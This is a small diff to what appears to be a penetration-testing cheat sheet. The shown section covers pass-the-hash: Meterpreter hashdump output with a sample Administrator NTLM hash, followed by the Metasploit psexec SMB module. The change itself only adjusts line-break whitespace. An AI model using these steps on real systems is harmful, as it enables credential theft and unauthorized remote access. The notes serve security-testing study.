@@ -40,7 +40,7 @@
 #### pass-the-hash
 ##### in meterpreter session
 > hashdump  
-> *Administrator:500:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef*
+> *Administrator:500:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef*  
 > background
 ##### from msfconsole
 > use exploit/windows/smb/psexec  
